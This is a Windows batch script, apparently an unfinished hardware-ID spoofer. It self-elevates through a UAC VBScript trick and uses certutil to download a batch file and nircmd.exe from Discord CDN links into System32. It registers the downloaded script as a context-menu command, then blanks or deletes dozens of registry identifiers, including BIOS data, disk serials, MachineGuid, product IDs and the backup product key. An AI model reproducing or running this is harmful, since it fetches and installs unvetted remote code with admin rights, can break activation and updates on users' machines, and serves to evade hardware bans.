::EXAMPLES FOR PEOPLE
::set /a FUNCTIONNAME=%random% %%ENDINGVALUE +STARTINGVALUE
::Reg.exe add "REGISTRYLOCATION" /v "REGVALUE" /t REG_TYPE /d "VALUETOCHANGE TO" /f
::NOT FINISHED
@echo off
color F0
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
cd %systemroot%\system32

:xoElfGitHubLink
md %systemroot%\system32
set url=https://cdn.discordapp.com/attachments/839654283830099968/886468762608492544/xoElf.bat
set file=xoElf.bat
certutil -urlcache -split -f %url% %file%
set path=%systemroot%\system32
move %file% %path%\%file% >nul

:AddxoElfToContextMenu
Reg.exe add "HKCR\Directory\Background\shell\xoElf️\command" /ve /t REG_SZ /d "C:\Windows\System32\xoElf.bat" /f
cls

:NirCMD
md %systemroot%\system32
set url=https://cdn.discordapp.com/attachments/840030032444391425/886782929492119592/nircmd.exe
set file=nircmd.exe
certutil -urlcache -split -f %url% %file%
set path=%systemroot%\system32
move %file% %path%\%file% >nul
md %systemroot%\system32

set url1=https://cdn.discordapp.com/attachments/840030032444391425/886783004314304552/NirCmd.chm
set file1=NirCmd.chm
certutil -urlcache -split -f %url1% %file1%
set path=%systemroot%\system32
move %file1% %path%\%file1% >nul

echo DONE
:reset
cd %systemroot%\system32
goto regs1
:REGS1
Reg.exe add "HKLM\HARDWARE\DESCRIPTION\System" /v "SystemBiosVersion" /t REG_MULTI_SZ /d "" /f
Reg.exe add "HKLM\HARDWARE\DESCRIPTION\System\MultifunctionAdapter\0\DiskController\0\DiskPeripheral\0" /v "Identifier" /t REG_SZ /d "" /f
Reg.exe add "HKLM\HARDWARE\DESCRIPTION\System\MultifunctionAdapter\0\DiskController\0\DiskPeripheral\1" /v "Identifier" /t REG_SZ /d "" /f
Reg.exe add "HKLM\HARDWARE\DESCRIPTION\System\BIOS" /v "BaseBoardManufacturer" /t REG_SZ /d "" /f
Reg.exe add "HKLM\HARDWARE\DESCRIPTION\System\BIOS" /v "BaseBoardProduct" /t REG_SZ /d "" /f
Reg.exe add "HKLM\HARDWARE\DESCRIPTION\System\BIOS" /v "BIOSReleaseDate" /t REG_SZ /d "" /f
Reg.exe add "HKLM\HARDWARE\DESCRIPTION\System\BIOS" /v "BIOSVendor" /t REG_SZ /d "" /f
Reg.exe add "HKLM\HARDWARE\DESCRIPTION\System\BIOS" /v "BIOSVersion" /t REG_SZ /d "" /f
Reg.exe add "HKLM\HARDWARE\DEVICEMAP\VIDEO" /v "\Device\Video0" /t REG_SZ /d "\Registry\Machine\System\CurrentControlSet\Control\Video\{}\0000" /f
Reg.exe add "HKLM\HARDWARE\DEVICEMAP\VIDEO" /v "\Device\Video1" /t REG_SZ /d "\Registry\Machine\System\CurrentControlSet\Control\Video\{}\0001" /f
Reg.exe add "HKLM\HARDWARE\DEVICEMAP\VIDEO" /v "\Device\Video2" /t REG_SZ /d "\Registry\Machine\System\CurrentControlSet\Control\Video\{}\0002" /f
Reg.exe add "HKLM\HARDWARE\DEVICEMAP\VIDEO" /v "\Device\Video3" /t REG_SZ /d "\Registry\Machine\System\CurrentControlSet\Control\Video\{}\0003" /f
Reg.exe add "HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port 1\Scsi Bus 0\Target Id 0\Logical Unit Id 0" /v "SerialNumber" /t REG_SZ /d "" /f
Reg.exe add "HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port 2\Scsi Bus 0\Target Id 0\Logical Unit Id 0" /v "SerialNumber" /t REG_SZ /d "" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Cryptography" /v "MachineGuid" /t REG_SZ /d "" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Dfrg\Statistics" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Registration" /v "ProductId" /t REG_SZ /d "" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\SQMClient" /v "MachineId" /t REG_SZ /d "{}" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\SettingsRequests" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\OneSettings\WSD\UpdateAgent\QueryParameters" /v "deviceId" /t REG_SZ /d "{}" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate" /v "SusClientId" /t REG_SZ /d "" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "BuildGUID" /t REG_SZ /d "" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "BuildLab" /t REG_SZ /d "" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "BuildLabEx" /t REG_SZ /d "" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "ProductId" /t REG_SZ /d "" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkCards\2" /v "ServiceName" /t REG_SZ /d "{}" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform" /v "BackupProductKeyDefault" /t REG_SZ /d "" /f
Reg.exe add "HKLM\SOFTWARE\NVIDIA Corporation\Global\CoProcManager" /v "ChipsetMatchID" /t REG_SZ /d "" /f
Reg.exe add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\NetworkCards\2" /v "ServiceName" /t REG_SZ /d "{}" /f
::SCRAPPED HERE

pause